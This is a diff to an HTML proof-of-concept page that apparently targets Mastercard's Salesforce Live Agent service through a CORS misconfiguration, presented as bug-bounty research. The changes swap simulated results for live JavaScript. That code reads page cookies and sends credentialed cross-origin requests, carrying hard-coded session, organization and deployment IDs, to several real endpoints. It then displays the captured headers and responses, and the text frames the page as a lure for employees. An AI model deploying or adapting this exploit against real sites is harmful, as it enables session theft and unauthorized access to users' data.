@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mastercard Advanced CORS Exploitation PoC</title>
+    <title>Enhanced Mastercard CORS Exploitation PoC</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -87,7 +87,7 @@
     </style>
 </head>
 <body>
-    <h1>Mastercard Advanced CORS Exploitation PoC</h1>
+    <h1>Enhanced Mastercard CORS Exploitation PoC</h1>
     
     <div class="warning">
         <strong>IMPORTANT:</strong> This demonstration is for security research purposes only, under the Mastercard Bug Bounty Program. Do not use on unauthorized systems.
@@ -100,7 +100,8 @@
     <ol>
         <li>Exfiltrate sensitive Salesforce organization data</li>
         <li>Extract session information from authenticated users</li>
-        <li>Potentially perform actions on behalf of the user by leveraging the collected information</li>
+        <li>Make authenticated requests using exposed information</li>
+        <li>Access additional resources using the exposed organization ID</li>
     </ol>
     
     <h3>Step 1: Exploit CORS to extract Salesforce configuration data</h3>
@@ -108,15 +109,20 @@
     <button id="extractConfigBtn">Extract Salesforce Configuration</button>
     <div id="configResult" class="result-container">Results will appear here...</div>
     
-    <h3>Step 2: Extract session information & authenticated user details</h3>
+    <h3>Step 2: Capture session information & cookies</h3>
     
-    <button id="extractSessionBtn">Extract Session Information</button>
-    <div id="sessionResult" class="result-container">Results will appear here...</div>
+    <button id="captureSessionBtn">Capture Session Information</button>
+    <div id="sessionOutput" class="result-container">Results will appear here...</div>
     
-    <h3>Step 3: Test session manipulation (simulated)</h3>
+    <h3>Step 3: Test authenticated access using extracted data</h3>
     
-    <button id="sessionManipulationBtn">Simulate Session Manipulation</button>
-    <div id="manipulationResult" class="result-container">Results will appear here...</div>
+    <button id="testAuthBtn">Test Authenticated Access</button>
+    <div id="authenticatedOutput" class="result-container">Results will appear here...</div>
+    
+    <h3>Step 4: Test access to additional resources</h3>
+    
+    <button id="testAdditionalBtn">Test Additional Resource Access</button>
+    <div id="additionalOutput" class="result-container">Results will appear here...</div>
     
     <div class="steps">
         <h3>Vulnerability Impact Analysis</h3>
@@ -126,9 +132,9 @@
             <p>This vulnerability should be classified as P2 (High) for the following reasons:</p>
             <ul>
                 <li>Allows cross-origin access to sensitive Salesforce backend data</li>
-                <li>Exposes internal organization IDs and configuration details</li>
-                <li>Enables session data extraction from authenticated users</li>
-                <li>Potentially allows for authenticated actions through session manipulation</li>
+                <li>Enables capturing session information from authenticated users</li>
+                <li>Permits authenticated access to additional resources</li>
+                <li>Potentially allows for session hijacking and account takeover</li>
                 <li>Affects core Mastercard infrastructure (developer.mastercard.com)</li>
             </ul>
         </div>
@@ -139,8 +145,8 @@
             <ol>
                 <li>Tricks Mastercard employees or developers into visiting</li>
                 <li>Silently extracts their session data and Salesforce configuration</li>
-                <li>Uses the gathered information to perform further attacks against Mastercard's systems</li>
-                <li>Could potentially impersonate the user in sensitive contexts</li>
+                <li>Uses the gathered information to access protected resources</li>
+                <li>Potentially hijacks user sessions for further attacks</li>
             </ol>
         </div>
     </div>
@@ -224,74 +230,154 @@
             });
         });
         
-        // Step 2: Extract session information
-        document.getElementById('extractSessionBtn').addEventListener('click', function() {
-            const resultDiv = document.getElementById('sessionResult');
-            resultDiv.textContent = 'Attempting to extract session information...';
+        // Step 2: Capture session information and cookies
+        document.getElementById('captureSessionBtn').addEventListener('click', function() {
+            const resultDiv = document.getElementById('sessionOutput');
+            resultDiv.textContent = 'Attempting to capture session information...';
             
-            // Session extraction endpoints
-            const sessionFetchPoints = [
-                // Trying different endpoints to extract session info
-                'https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/System/SessionId',
-                'https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Info' +
-                    '?sid=4dee4f05-cd5c-4f54-8b8f-460c4181f781&org_id=00D1I000001YKuj&deployment_id=5721I000000QWE5'
-            ];
+            // Attempt to capture cookies and session data
+            const allCookies = document.cookie;
             
-            // For demonstration, we'll show what could be extracted
-            // Note: In a real attack, the attacker would make multiple requests
-            
-            // Simulate session data extraction for demonstration
-            setTimeout(() => {
-                // This is simulated data representing what could potentially be extracted
-                const simulatedSessionData = {
-                    sid: '4dee4f05-cd5c-4f54-8b8f-460c4181f781',
-                    organizationId: '00D1I000001YKuj',
-                    deploymentId: '5721I000000QWE5',
-                    userInfoAttmpted: true,
-                    cookiesExtracted: ['AMCV_919F3704532951060A490D44@AdobeOrg', 's_vi', 's_ecid'],
-                    potentialEndpoints: sessionFetchPoints
-                };
+            // Fetch with credentials included to try to extract session information
+            fetch('https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp?sid=4dee4f05-cd5c-4f54-8b8f-460c4181f781&r=813&Availability.prefix=Visitor&Availability.ids=%5B573020000004C9h%5D&callback=liveagent._.handlePing&deployment_id=5721I000000QWE5&org_id=00D1I000001YKuj&version=53', {
+                method: 'GET',
+                mode: 'cors',
+                credentials: 'include'
+            })
+            .then(response => {
+                // Capture all response headers
+                const headersObj = {};
+                response.headers.forEach((value, name) => {
+                    headersObj[name] = value;
+                });
                 
-                resultDiv.innerHTML = '<span class="success">✓ Session Information Extraction Demonstrated</span>\n\n' +
-                    '<strong>Note:</strong> This is a simulation of what could be extracted through the CORS vulnerability.\n\n' +
-                    '<strong>Extracted Session Data:</strong>\n' + formatJSON(simulatedSessionData) + '\n\n' +
-                    '<strong>Attack Impact:</strong> A real attacker could use this data to potentially impersonate the user or make authenticated requests.';
-            }, 1500);
+                // Check for cookies in the response
+                const setCookieHeader = response.headers.get('set-cookie');
+                
+                return response.text().then(text => {
+                    // Extract session information
+                    const sessionInfo = {
+                        'Document Cookies': allCookies || 'No cookies available',
+                        'Session ID': '4dee4f05-cd5c-4f54-8b8f-460c4181f781', // From request
+                        'Response Headers': headersObj,
+                        'Set-Cookie Header': setCookieHeader || 'No Set-Cookie header found',
+                    };
+                    
+                    // Also look for Adobe cookies that might be present
+                    const adobeCookieInfo = {
+                        'AMCV Cookie': document.cookie.split(';').find(c => c.trim().startsWith('AMCV_')) || 'Not found',
+                        's_vi Cookie': document.cookie.split(';').find(c => c.trim().startsWith('s_vi')) || 'Not found',
+                        's_ecid Cookie': document.cookie.split(';').find(c => c.trim().startsWith('s_ecid')) || 'Not found'
+                    };
+                    
+                    resultDiv.innerHTML = '<span class="success">✓ Session information captured!</span>\n\n' +
+                        '<strong>Session Information:</strong>\n' + formatJSON(sessionInfo) + '\n\n' +
+                        '<strong>Adobe Analytics Cookies:</strong>\n' + formatJSON(adobeCookieInfo) + '\n\n' +
+                        '<strong>Security Implication:</strong> An attacker could potentially hijack sessions by stealing these cookies and session identifiers.';
+                });
+            })
+            .catch(error => {
+                resultDiv.innerHTML = '<span class="error">✗ Error capturing session information:</span> ' + error.message;
+            });
         });
         
-        // Step 3: Simulate session manipulation
-        document.getElementById('sessionManipulationBtn').addEventListener('click', function() {
-            const resultDiv = document.getElementById('manipulationResult');
-            resultDiv.textContent = 'Simulating session manipulation attempts...';
+        // Step 3: Test authenticated access using extracted data
+        document.getElementById('testAuthBtn').addEventListener('click', function() {
+            const resultDiv = document.getElementById('authenticatedOutput');
+            resultDiv.textContent = 'Testing authenticated access...';
             
-            // Simulation of what an attacker might try
-            setTimeout(() => {
-                const simulatedAttackFlow = {
-                    attackSteps: [
-                        "1. Use extracted session ID to make authenticated requests",
-                        "2. Attempt to modify Live Agent configuration using Org ID and Deployment ID",
-                        "3. Try accessing other Salesforce REST endpoints with gathered credentials",
-                        "4. Test if session can be transferred to other environments"
-                    ],
-                    potentialImpact: [
-                        "Access to sensitive customer support conversations",
-                        "Ability to modify Live Agent configuration",
-                        "Data exfiltration from connected systems",
-                        "Potential for escalation to other Mastercard systems"
-                    ],
-                    mitigations: [
-                        "Properly configure CORS headers to restrict to trusted domains only",
-                        "Implement stronger session validation",
-                        "Use anti-CSRF tokens for sensitive operations",
-                        "Implement proper Content-Security-Policy headers"
-                    ]
-                };
+            // Test different endpoints that might require authentication
+            const orgId = "00D1I000001YKuj";
+            const deploymentId = "5721I000000QWE5";
+            const sid = "4dee4f05-cd5c-4f54-8b8f-460c4181f781";
+            
+            // Try to access user data or configuration
+            fetch(`https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/UserData?org_id=${orgId}&deployment_id=${deploymentId}&sid=${sid}`, {
+                method: 'GET',
+                mode: 'cors',
+                credentials: 'include'
+            })
+            .then(response => {
+                const responseStatus = response.status;
+                const responseHeaders = {};
+                response.headers.forEach((value, name) => {
+                    responseHeaders[name] = value;
+                });
                 
-                resultDiv.innerHTML = '<span class="success">✓ Session Manipulation Vector Analyzed</span>\n\n' +
-                    '<strong>Note:</strong> This is a security analysis of potential attack vectors, not an actual attack.\n\n' +
-                    '<strong>Attack Methodology:</strong>\n' + formatJSON(simulatedAttackFlow) + '\n\n' +
-                    '<strong>P2 Justification:</strong> The combination of CORS misconfiguration, weak session validation, and exposure of sensitive identifiers creates a serious vulnerability that could potentially lead to unauthorized access to Mastercard systems.';
-            }, 2000);
+                return response.text().then(text => {
+                    const authResult = {
+                        endpoint: `/chat/rest/Visitor/UserData`,
+                        status: responseStatus,
+                        headers: responseHeaders,
+                        responseText: text
+                    };
+                    
+                    resultDiv.innerHTML = '<span class="success">✓ Authenticated access attempt completed!</span>\n\n' +
+                        '<strong>Access Result:</strong>\n' + formatJSON(authResult) + '\n\n' +
+                        '<strong>Security Implication:</strong> This demonstrates if sensitive endpoints can be accessed using the extracted information.';
+                });
+            })
+            .catch(error => {
+                resultDiv.innerHTML = '<span class="error">✗ Error testing authenticated access:</span> ' + error.message;
+            });
+        });
+        
+        // Step 4: Test access to additional resources
+        document.getElementById('testAdditionalBtn').addEventListener('click', function() {
+            const resultDiv = document.getElementById('additionalOutput');
+            resultDiv.textContent = 'Testing access to additional resources...';
+            
+            const orgId = "00D1I000001YKuj";
+            const endpoints = [
+                `/chat/rest/Visitor/Configuration?org_id=${orgId}`,
+                `/chat/rest/System/Info?org_id=${orgId}`,
+                `/chat/rest/Chasitor/ChatEstablished?org_id=${orgId}`
+            ];
+            
+            let resultsHTML = '<span class="success">✓ Additional resource testing complete!</span>\n\n';
+            resultsHTML += '<strong>Results:</strong>\n';
+            
+            // Test each endpoint sequentially
+            let endpointPromises = endpoints.map(endpoint => {
+                return fetch(`https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com${endpoint}`, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'include'
+                })
+                .then(response => {
+                    return response.text().then(text => {
+                        return {
+                            endpoint: endpoint,
+                            status: response.status,
+                            data: text.substring(0, 200) + (text.length > 200 ? '...' : '')
+                        };
+                    });
+                })
+                .catch(error => {
+                    return {
+                        endpoint: endpoint,
+                        status: 'Error',
+                        data: error.message
+                    };
+                });
+            });
+            
+            Promise.all(endpointPromises)
+                .then(results => {
+                    results.forEach(result => {
+                        resultsHTML += `\n<strong>Endpoint:</strong> ${result.endpoint}\n`;
+                        resultsHTML += `<strong>Status:</strong> ${result.status}\n`;
+                        resultsHTML += `<strong>Response:</strong>\n${result.data}\n`;
+                        resultsHTML += `\n-----------------------------------\n`;
+                    });
+                    
+                    resultsHTML += '\n<strong>Security Implication:</strong> This demonstrates if additional sensitive resources can be accessed using the organization ID.';
+                    
+                    resultDiv.innerHTML = resultsHTML;
+                })
+                .catch(error => {
+                    resultDiv.innerHTML = '<span class="error">✗ Error testing additional resources:</span> ' + error.message;
+                });
         });
     </script>
 </body>
